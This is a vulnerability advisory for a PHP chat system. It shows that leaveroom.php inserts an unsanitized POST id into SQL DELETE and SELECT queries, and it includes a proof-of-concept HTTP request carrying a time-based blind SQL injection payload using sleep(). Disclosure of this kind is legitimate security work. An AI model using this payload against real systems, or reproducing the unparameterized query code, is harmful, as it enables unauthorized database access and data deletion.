# chat system has sql injection in /user/leaveroom.php



## supplier



https://code-projects.org/chat-system-using-php-source-code/



## Vulnerability file



/user/leaveroom.php



## describe


The id parameter is not properly sanitized or parameterized, which leaves it vulnerable to SQL injection attacks. Attackers can exploit this by injecting malicious SQL code to manipulate the database queries. Utilizing time-based SQL injection methods, they can introduce intentional delays in the database response through functions such as SLEEP(). This technique can be employed to verify the existence of the vulnerability and may also be used to extract sensitive information from the database.



## **Code analysis**



```php
<?php
	include('session.php');
	if (isset($_POST['leave'])){
		$id=$_POST['id'];
		
		mysqli_query($conn,"delete from chat_member where userid='".$_SESSION['id']."' and chatroomid='$id'");
		
		//remove room if no more member
		$r=mysqli_query($conn,"select * from chat_member where chatroomid='$id'");
		if (mysqli_num_rows($r)<1){
			mysqli_query($conn,"delete from chatroom where chatroomid='$id'");
		}
		
	}

?>
```

Inserting $_POST['id'] into Mysql without any filter. A time-based blind SQL injection can be triggered.





## POC

```http
POST /user/leaveroom.php HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 26
Cache-Control: max-age=0
Cookie: PHPSESSID=37s949bl7lo8mj992ts8np9vio
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8081/user/modal.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

leave=1&id=4' or sleep(5)#
```



Send this request, you can observe an additional 30-second (5 * 3 * 2) time delay triggered by the time-based injection.

